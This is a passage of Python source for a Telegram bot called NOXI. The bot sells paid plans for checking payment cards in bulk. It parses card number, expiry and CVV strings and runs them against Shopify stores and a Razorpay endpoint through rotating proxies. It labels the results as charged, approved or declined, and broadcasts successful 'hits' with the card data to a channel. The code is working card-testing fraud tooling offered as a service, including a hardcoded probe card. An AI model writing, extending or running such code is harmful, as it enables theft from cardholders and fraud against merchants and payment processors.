    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False

# ====================== ACCESS ======================
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"

async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan

def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID:
        return 10000
    p = plan.title() if plan else "Bronze"
    if p == "X": return 10000
    if p == "Root": return 5000
    if p == "Elite": return 2500
    if p == "Core": return 1500
    return 0

def is_paid_plan(plan):
    return plan.title() in PAID_TIERS if plan else False

async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Group Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Free users')} → {bs('group only')}</b>
{PE} <i>{bs('Upgrade for private access')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])

async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/SUPERGREMLIN01")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])

def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]

# ====================== UTILITIES ======================
def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))

def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
    return result

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else: return None
    if not h or not p: return None
    try:
        if not (0 < int(p) <= 65535): return None
    except: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e:
        return False, str(e)

# ====================== SHOPIFY CHECKER (Local API) ======================
def _proxy_to_checker_format(proxy_data):
    if not proxy_data:
        return None
    ip = proxy_data.get('ip')
    port = proxy_data.get('port')
    user = proxy_data.get('username') or ''
    pw = proxy_data.get('password') or ''
    if user and pw:
        return f"http://{user}:{pw}@{ip}:{port}"
    return f"http://{ip}:{port}"

async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    try:
        proxy_str = _proxy_to_checker_format(proxy_data) if proxy_data else None
        payload = {
            "card": card,
            "shop_url": site if site.startswith('http') else f'https://{site}',
            "gateway": "shopify"
        }
        if proxy_str:
            payload["proxy"] = proxy_str
        client = await _get_checker_client()
        resp = await client.post(f"{CHECKER_API_URL}/check", json=payload)
        if resp.status_code != 200:
            return {
                "Response": f"HTTP_{resp.status_code}",
                "Price": "-",
                "Gateway": "Shopify",
                "Status": "SiteError",
                "card": card,
                "site": site
            }
        data = resp.json()
        status = data.get("status", "ERROR").upper()
        message = data.get("message", "")
        price = data.get("amount", "-")
        gateway = data.get("gateway", "Shopify")
        receipt = data.get("receipt_url", "")
        if status == "CHARGED":
            status_out = "Charged"
        elif status == "APPROVED":
            status_out = "Approved"
        elif status == "DECLINED":
            status_out = "Declined"
        else:
            status_out = "SiteError"
        return {
            "Response": message,
            "Price": price,
            "Gateway": gateway,
            "Status": status_out,
            "card": card,
            "site": site,
            "receipt_url": receipt
        }
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {
            "Response": err[:100],
            "Price": "-",
            "Gateway": "Unknown",
            "Status": st2,
            "card": card,
            "site": site
        }

async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        if rotator: site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator: proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.3)
    if last:
        last["Status"] = "Error"
        return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1

async def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        if not site:
            return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Site is empty'}
        result = await check_card_api(test_card, site, proxy_data, http_session=http_session)
        rm = result.get('Response', '')
        price = result.get('Price', '-')
        status = result.get('Status')
        if status == "SiteError" or is_site_error(rm.lower()):
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        if not is_truly_alive(rm, price):
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ====================== RAZORPAY API ======================
def clean_rz_response(raw_resp):
    if not raw_resp:
        return raw_resp
    cleaned = re.sub(r'^(?:DEAD|LIVE|SUCCESS|CHARGED|APPROVED|DECLINED)\s*\|\s*ID:\s*pay_[a-zA-Z0-9]+\s*\|\s*', '', raw_resp, flags=re.IGNORECASE).strip()
    return cleaned if cleaned else raw_resp

def classify_rz_response(rj):
    gate = 'RazorPay'
    raw_resp = str(rj.get('response', rj.get('Response', '')))
    resp = clean_rz_response(raw_resp)
    rl = resp.lower()
    if is_rz_retry_error(resp):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "RetryError"}
    rz_charged = ['transaction success', 'payment successful', 'payment success', 'order_paid', 'charged']
    rz_approved = [
        'your payment could not be completed due to insufficient account balance',
        'insufficient account balance',
        'insufficient_funds', 'insufficient funds',
        'otp_required', 'otp required',
        '3d_authentication', '3ds_required',
        'authentication_required',
        'cvc', 'ccn',
    ]
    rz_declined = [
        'your payment has been cancelled',
        'payment cancelled', 'cancelled',
        'card_declined', 'card declined',
        'generic_decline', 'generic decline',
        'do_not_honor', 'do not honor',
        'stolen_card', 'lost_card',
        'expired_card', 'expired card',
        'restricted_card', 'fraudulent',
        'not_permitted', 'transaction_not_allowed',
        'card_not_supported', 'decline',
        'your card was declined',
        'payment failed', 'failed',
        'generic_error',
    ]
    if any(k in rl for k in rz_charged):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Charged"}
    if any(k in rl for k in rz_approved):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Approved"}
    if any(k in rl for k in rz_declined):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}
    return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}

async def check_rz_api(card, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}
        card_num, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy
        payload = {
            "card": card_num,
            "month": mm,
            "year": yy,
            "cvv": cvv
        }
        if proxy_data:
            payload["proxy"] = proxy_data.get('proxy_url')
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.post(RAZORPAY_API_URL, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
            try:
                rj = await r.json(content_type=None)
            except:
                return {"Response": "Invalid JSON", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
        result = classify_rz_response(rj)
        result["card"] = card
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": str(e)[:100], "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}

async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}
        proxy_data = None
        if proxies_data:
            available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
            proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_rz_api(card, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "RetryError":
            return result
        last = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    if last:
        last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}

# ====================== STATUS SYSTEM ======================
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    uptime_seconds = int(time.time() - psutil.boot_time())
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def _get_bot_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def _create_progress_bar(percentage, length=10):
    filled_length = int(length * percentage / 100)
    return f"{'█' * filled_length}{'░' * (length - filled_length)} {percentage:.1f}%"

def _get_system_info():
    if not PSUTIL_AVAILABLE:
        return {"error": "psutil not installed", "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu_usage = psutil.cpu_percent(interval=0)
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        network = psutil.net_io_counters()
        network_interfaces = psutil.net_if_addrs()
        active_interfaces = [i for i in network_interfaces.keys() if not i.startswith(('lo', 'docker', 'br-'))]
        return {
            "cpu_usage": cpu_usage, "cpu_count": cpu_count,
            "cpu_freq": cpu_freq.current if cpu_freq else 0,
            "total_memory": memory.total / (1024**3), "used_memory": memory.used / (1024**3),
            "available_memory": memory.available / (1024**3), "memory_percent": memory.percent,
            "total_disk": disk.total / (1024**3), "used_disk": disk.used / (1024**3),
            "free_disk": disk.free / (1024**3), "disk_percent": disk.percent,
            "hostname": socket.gethostname(), "os_name": platform.system(),
            "os_version": platform.version(), "architecture": platform.machine(),
            "bytes_sent": network.bytes_sent / (1024**2), "bytes_recv": network.bytes_recv / (1024**2),
            "active_interfaces": active_interfaces, "uptime_str": _get_system_uptime(),
            "bot_uptime_str": _get_bot_uptime(),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bot_restart_time": datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_critical": cpu_usage > 90, "memory_critical": memory.percent > 90,
            "disk_critical": disk.percent > 90, "error": None
        }
    except Exception as e:
        return {"error": str(e), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

async def _build_status_text():
    sys_info = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if sys_info.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {sys_info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/SUPERGREMLIN01'>𝐍𝐎𝐗𝐈</a>"
    os_v = sys_info["os_version"].split("-")[0] if "-" in sys_info["os_version"] else sys_info["os_version"]
    s = sys_info
    msg = (
        f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
        f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
        f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
        f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['cpu_usage'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['memory_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['disk_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n"
    )
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]:
        msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/SUPERGREMLIN01'>𝐍𝐎𝐗𝐈</a>"
    return msg

# ====================== HIT NOTIFICATIONS ======================
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type)
        resp = res.get('Response', '')
        card = res.get('card', '')
        if gate_type == "RazorPay":
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
🃏 <b>{bs('Card')}</b> » <tg-spoiler>{card}</tg-spoiler>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
🃏 <b>{bs('Card')}</b> » <tg-spoiler>{card}</tg-spoiler>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except Exception as e:
        log_user(uid, "HIT_CHANNEL_ERROR", f"Error={e}", "error")

async def pin_charged_message(event, msg):
    try:
        if event.is_group: await msg.pin()
    except: pass

# ====================== ADDITIONAL DATABASE FUNCTIONS ======================
async def add_admin(user_id: int):
    await db["admins"].update_one({"user_id": user_id}, {"$set": {"user_id": user_id}}, upsert=True)

async def remove_admin(user_id: int):
    await db["admins"].delete_one({"user_id": user_id})

async def get_admins() -> List[int]:
    cursor = db["admins"].find()
    docs = await cursor.to_list(length=1000)
    return [doc["user_id"] for doc in docs]

async def is_admin_user(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    doc = await db["admins"].find_one({"user_id": user_id})
    return doc is not None

async def generate_key(amount: int, hours: int, user_limit: int, price: str = "0"):
    key_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry = datetime.utcnow() + timedelta(hours=hours)
    await db["keys"].insert_one({
        "key": key_str,
        "amount": amount,
        "hours": hours,
        "user_limit": user_limit,
        "price": price,
        "expiry": expiry,
        "used": False,
        "created_at": datetime.utcnow()
    })
    return key_str

async def redeem_key(key: str, user_id: int) -> dict:
    doc = await db["keys"].find_one({"key": key, "used": False})
    if not doc:
        return {"success": False, "msg": "Invalid or used key"}
    if doc["expiry"] < datetime.utcnow():
        return {"success": False, "msg": "Key expired"}
    await set_user_plan(user_id, "Premium", doc["hours"] // 24)
    await db["users"].update_one({"user_id": user_id}, {"$set": {"premium_limit": doc["user_limit"]}}, upsert=True)
    await db["keys"].update_one({"_id": doc["_id"]}, {"$set": {"used": True, "used_by": user_id, "used_at": datetime.utcnow()}})
    return {"success": True, "msg": f"Premium added with limit {doc['user_limit']}"}

async def get_keys():
    cursor = db["keys"].find().sort("created_at", -1)
    return await cursor.to_list(length=1000)

async def add_filter(gateway: str, min_price: float, max_price: float, name: str):
    await db["filters"].insert_one({
        "gateway": gateway,
        "min": min_price,
        "max": max_price,
        "name": name,
        "created_at": datetime.utcnow()
    })

async def get_filters():
    cursor = db["filters"].find()
    return await cursor.to_list(length=1000)

async def remove_filter(gateway: str, index: int):
    filters = await get_filters()
    if 0 <= index < len(filters):
        fil = filters[index]
        if fil["gateway"] == gateway:
            await db["filters"].delete_one({"_id": fil["_id"]})
            return True
    return False

async def set_setting(key: str, value):
    await db["settings"].update_one({"key": key}, {"$set": {"value": value, "updated_at": datetime.utcnow()}}, upsert=True)

async def get_setting(key: str, default=None):
    doc = await db["settings"].find_one({"key": key})
    return doc["value"] if doc else default

async def add_hit_video(file_id: str):
    await db["hitvideos"].insert_one({"file_id": file_id, "added_at": datetime.utcnow()})

async def get_hit_videos():
    cursor = db["hitvideos"].find().sort("added_at", 1)
    return await cursor.to_list(length=100)

async def remove_hit_video(index: int):
    videos = await get_hit_videos()
    if 0 <= index < len(videos):
        await db["hitvideos"].delete_one({"_id": videos[index]["_id"]})
        return True
    return False

async def set_welcome_video(file_id: str):
    await set_setting("welcome_video", file_id)

async def get_welcome_video():
    return await get_setting("welcome_video", None)

async def toggle_bot(state: bool):
    await set_setting("bot_enabled", state)

async def get_bot_toggle() -> bool:
    return await get_setting("bot_enabled", True)

async def get_threshold():
    return await get_setting("price_threshold", 0)

async def set_threshold(value: float):
    await set_setting("price_threshold", value)

# ====================== CLIENT ======================
client = TelegramClient('noxi_bot', API_ID, API_HASH)
client_instance = client

# ====================== /start ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        if is_paid_plan(plan):
            plan_emoji = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ {plan_emoji} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
            se = []
        user_entity = await client_instance.get_entity(event.sender_id)
        username = f"@{user_entity.username}" if user_entity.username else f"user_{event.sender_id}"
        name = user_entity.first_name or "User"
        text = f"""🤖 <b>NOXI</b>

👤 <b>User</b> → <a href='tg://user?id={event.sender_id}'>{name}</a>
🔑 <b>ID</b> → <code>{event.sender_id}</code>
💎 <b>Status</b> → {'🟢 Premium' if is_paid_plan(plan) else '🟡 Free'}
⚡ <b>Limit</b> → {limit if limit else 'Unlimited'}

Select an option below to get started.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{sl}"""
        kb = [
            [colored_button(pe("💳 Gates"), "gates", "primary")],
            [colored_button(pe("🔌 Proxy Setup"), "manage_proxy", "primary")],
            [colored_button(pe("📋 Plans"), "show_plans", "success")],
            [colored_button(pe("💬 Support"), "support", "secondary"), colored_button(pe("❌ Close"), "close", "danger")],
        ]
        if await is_admin_user(event.sender_id):
            kb.insert(3, [colored_button(pe("👑 Admin Panel"), "admin_panel", "danger")])
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["brain"], CE["plus"], CE["cross"], CE["globe"], CE["link"], CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["info"], CE["info"]] + se
        await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")

# ====================== CALLBACKS ======================
@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome to NOXI')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/SUPERGREMLIN01")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

@client.on(events.CallbackQuery(data=b"support"))
async def support_cb(event):
    await event.answer()
    await styled_send(event.chat_id, f"{PE} <b>{bs('Contact Support')}</b>\n{PE} @SUPERGREMLIN01", emoji_ids=[CE["info"]])

@client.on(events.CallbackQuery(data=b"close"))
async def close_cb(event):
    await event.answer()
    try:
        await event.delete()
    except:
        pass

@client.on(events.CallbackQuery(data=b"gates"))
async def gates_cb(event):
    await event.answer()
    text = pe(
        f"<b>💳 GATE SELECTION</b>\n"
        f"────────────────────\n"
        f"Choose your check type:\n"
    )
    kb = [
        [colored_button(pe("⚡ Shopify – Single"), "gate_shopify_single", "primary")],
        [colored_button(pe("🔥 Shopify – Mass"), "gate_shopify_mass", "success")],
        [colored_button(pe("💳 Razorpay – Single"), "gate_rz_single", "primary")],
        [colored_button(pe("📦 Razorpay – Mass"), "gate_rz_mass", "success")],
        [colored_button(pe("↩️ Back"), "back_start", "secondary")]
    ]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(data=b"manage_proxy"))
async def manage_proxy_cb(event):
    if event.is_group:
        await event.answer("❌ Private chat only!", alert=True)
        return
    await event.answer()
    proxies = await get_all_user_proxies(event.sender_id)
    proxy_list = "\n".join(f"<code>{p['ip']}:{p['port']}</code>" for p in proxies[:10]) if proxies else "None"
    text = pe(
        f"<b>🔌 Proxy Management</b>\n"
        f"────────────────────\n"
        f"<b>Your Proxies:</b>\n{proxy_list}\n"
        f"────────────────────\n"
        f"<code>/addpxy ip:port:user:pass</code>\n"
        f"<code>/rmpxy index</code> or <code>all</code>\n"
        f"<code>/chkpxy</code> to test all"
    )
    kb = [[colored_button("↩️ Back", "back_start", "secondary")]]
    await nav_edit(event.chat_id, event.message_id, text, kb)

@client.on(events.CallbackQuery(pattern=b"gate_shopify_single"))
async def gate_shopify_single(event):
    await event.answer("ℹ️ Use /sh card|mm|yy|cvv", alert=True)

@client.on(events.CallbackQuery(pattern=b"gate_shopify_mass"))
async def gate_shopify_mass(event):
    await event.answer("ℹ️ Reply to .txt with /msh", alert=True)

@client.on(events.CallbackQuery(pattern=b"gate_rz_single"))
async def gate_rz_single(event):
    await event.answer("ℹ️ Use /rz card|mm|yy|cvv", alert=True)

@client.on(events.CallbackQuery(pattern=b"gate_rz_mass"))
async def gate_rz_mass(event):
    await event.answer("ℹ️ Reply to .txt with /mrz", alert=True)

@client.on(events.CallbackQuery(data=b"back_start"))
async def back_start_cb(event):
    await event.answer()
    # Re‑send start menu (reuse /start logic)
    await start(event)

# ====================== ADMIN PANEL ======================
@client.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_cb(event):
    if not await is_admin_user(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    text = pe(
        f"<b>👑 Admin Panel  —  NOXI</b>\n"
        f"────────────────────\n"
        f"🟢 <b>Status</b>      »  Online\n"
        f"👤 <b>Users</b>       »  {await get_total_users()} total\n"
        f"🌐 <b>Sites</b>        »  {await get_total_sites_count()} loaded\n"
        f"📡 <b>Proxy Pool</b>  »  {await get_proxy_count(0)} proxies\n"
        f"────────────────────\n"
        f"Select a section:"
    )
    kb = [
        [colored_button("📋 Premium Management", "admin_premium", "primary")],
        [colored_button("🌐 Shopify Sites Management", "admin_sites_management", "primary")],
        [colored_button("🔧 Price Filters", "admin_filters", "primary")],
        [colored_button("🎬 Video Management", "admin_videos", "primary")],
